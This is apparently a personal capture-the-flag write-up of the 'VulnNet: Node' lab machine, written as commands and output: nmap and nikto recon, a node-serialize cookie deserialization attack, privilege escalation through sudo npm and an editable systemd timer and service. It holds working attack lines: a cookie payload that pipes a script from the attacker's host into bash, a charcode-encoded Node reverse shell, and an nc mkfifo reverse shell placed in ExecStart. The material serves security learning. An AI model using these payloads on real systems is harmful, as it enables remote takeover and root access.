Name:  VulnNet: Node
Date:  
Difficulty: Easy 
Description:  After the previous breach, VulnNet Entertainment states it won't happen again. Can you prove they're wrong?
Better Description: [JAVASCRIPT](https://www.youtube.com/watch?v=Uo3cL4nrGOk)
Goals: General learn machine for JS "experience" with Javascript; jwt abusing; node related madness
Learnt: JAVASCRIPT; service file configuration; Echo > editor

## Recon

```bash
root@ip-10-10-122-213:~# ping -c 3 10.10.129.19
PING 10.10.129.19 (10.10.129.19) 56(84) bytes of data.
64 bytes from 10.10.129.19: icmp_seq=1 ttl=64 time=0.707 ms
64 bytes from 10.10.129.19: icmp_seq=2 ttl=64 time=0.453 ms
64 bytes from 10.10.129.19: icmp_seq=3 ttl=64 time=0.415 ms

--- 10.10.129.19 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2050ms
rtt min/avg/max/mdev = 0.415/0.525/0.707/0.129 ms

root@ip-10-10-122-213:~# nmap -sC -sV -p- 10.10.129.19 --min-rate 5000

Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-10 19:49 BST
Nmap scan report for ip-10-10-129-19.eu-west-1.compute.internal (10.10.129.19)
Host is up (0.00051s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
MAC Address: 02:E0:BC:97:E8:B7 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.99 seconds
root@ip-10-10-122-213:~# nikto -h 10.10.129.19:8080
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.129.19
+ Target Hostname:    ip-10-10-129-19.eu-west-1.compute.internal
+ Target Port:        8080
+ Start Time:         2022-05-10 19:51:07 (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Cookie session created without the httponly flag
+ Retrieved x-powered-by header: Express
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/1daf 0xdPXia8DLlOwYnTXebWSDo/Cj9Co 
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'content-security-policy' found, with contents: default-src 'none'
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD 
+ OSVDB-3092: /login/: This might be interesting...
+ 6544 items checked: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2022-05-10 19:51:21 (GMT1) (14 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Writeup notices strange set cookie
```bash
root@ip-10-10-122-213:~# curl -I http://10.10.233.140:8080
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D; Max-Age=1200; Path=/; Expires=Tue, 10 May 2022 19:59:52 GMT; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 7599
ETag: W/"1daf-dPXia8DLlOwYnTXebWSDo/Cj9Co"
Date: Tue, 10 May 2022 19:39:54 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

Decode from Base64:
```json
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
ÃÜ
```

```json
{"username":"_$$ND_FUNC$$_require('child_process').exec('curl 10.8.73.218/shell.sh | bash', function(error, stdout, stderr) { console.log(stdout) })","isGuest":true,"encoding": "utf-8"}
```
I used curl to be cool

```bash
curl -b 'eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCBodHRwOi8vMTAuMTAuMTIyLjIxMzo4ODg4L3NoZWxsLnNoIHwgYmFzaCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pIiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ' http://10.10.233.140:8080
```

Then we need to excute the shell. But I tried with another cookie:
```json
{"username":"_$$ND_FUNC$$_require('child_process').exec('chmod +x shell.sh;./shell.sh | bash', function(error, stdout, stderr) { console.log(stdout) })","isGuest":true,"encoding": "utf-8"}

```
But this did not work I will try nodejsshell.py and incept request with burp like:
https://falseintel.github.io/thm-vulnnet-node-writeup.html
https://titus74.com/thm-writeup-vulnnet-node/

```bash
root@ip-10-10-220-33:~# python2 nodejsshell.py 10.10.220.33 1234
[+] LHOST = 10.10.220.33
[+] LPORT = 1234
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,50,50,48,46,51,51,34,59,10,80,79,82,84,61,34,49,50,51,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

Base64 encode this and burp intercept the request. Stablise the shell and PrivEsc away
```bash
www@vulnnet-node:/home$ sudo -l
sudo -l
Matching Defaults entries for www on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm
```
[gtfobin](https://gtfobins.github.io/gtfobins/npm/)
```bash
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
# falseintel added:> chmod 777 $TF
sudo -u serv-manage npm -C $TF --unsafe-perm i
```

Sudo -l check -> locate binery affect

```bash
serv-manage@vulnnet-node:~$ sudo -l
sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
serv-manage@vulnnet-node:~$ locate vulnnet-auto.timer 
locate vulnnet-auto.timer
/etc/systemd/system/vulnnet-auto.timer
serv-manage@vulnnet-node:~$ ls -la /etc/systemd/system/vulnnet-auto.timer
ls -la /etc/systemd/system/vulnnet-auto.timer
-rw-rw-r-- 1 root serv-manage 167 Jan 24  2021 /etc/systemd/system/vulnnet-auto.timer
serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-auto.timer
cat /etc/systemd/system/vulnnet-auto.timer
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```
It calls vulnnet-job.service

```bash
serv-manage@vulnnet-node:~$ locate vulnnet-auto.timer 
locate vulnnet-auto.timer
/etc/systemd/system/vulnnet-auto.timer
serv-manage@vulnnet-node:~$ ls -la /etc/systemd/system/vulnnet-auto.timer
ls -la /etc/systemd/system/vulnnet-auto.timer
-rw-rw-r-- 1 root serv-manage 167 Jan 24  2021 /etc/systemd/system/vulnnet-auto.timer
serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-auto.timer
cat /etc/systemd/system/vulnnet-auto.timer
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
serv-manage@vulnnet-node:~$ locate vulnnet-job.service
locate vulnnet-job.service
/etc/systemd/system/vulnnet-job.service
serv-manage@vulnnet-node:~$ ls -la /etc/systemd/system/vulnnet-job.service
ls -la /etc/systemd/system/vulnnet-job.service
-rw-rw-r-- 1 root serv-manage 197 Jan 24  2021 /etc/systemd/system/vulnnet-job.service
```

Due to the vulnnet-job.service is owned by serv-manage; add a reverse shell that gets executed on startup
with the `ExecStart`
```bash
serv-manage@vulnnet-node:/$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.220.33 4444 >/tmp/f" > /tmp/shell.sh
serv-manage@vulnnet-node:/$ chmod 777 /tmp/shell.sh 
```
Use echo to overwrite the service and timer files.
Cat the files, copy them into a clipboard edit it, type out; edit in the clipboard making chaneg and added stdout `echo "` + paste for:
```bash
serv-manage@vulnnet-node:/$ cat /etc/systemd/system/vulnnet-auto.timer
[Unit]
Description=Run VulnNet utitilies every 1 min

[Timer]
OnBootSec=0min
OnCalendar=*:0/1
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```
And the same for the service file:
```bash
serv-manage@vulnnet-node:/$ cat /etc/systemd/system/vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/tmp/shell.sh
[Install]
WantedBy=multi-user.target
```

